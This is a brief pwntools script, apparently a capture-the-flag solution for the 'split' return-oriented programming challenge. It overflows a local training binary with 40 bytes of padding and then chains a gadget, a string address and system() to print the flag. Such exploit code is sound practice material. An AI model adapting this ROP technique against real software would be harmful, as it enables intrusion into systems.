from pwn import *
# Set up pwntools to work with this binary
elf = context.binary = ELF('split')
# Print out system address
info("%#x system", elf.symbols.system)
system = p64(elf.symbols.system)
# Print flag
print_flag = p64(elf.symbols.usefulString)
# Gadget
gadget = p64(0x0000000000400883)
# Send the payload
io = process(elf.path)
payload = b"A"*40 + gadget + print_flag + system
io.sendline(payload)
io.recvuntil("> ")
# Get our flag!
flag = io.recvline()
info(flag)
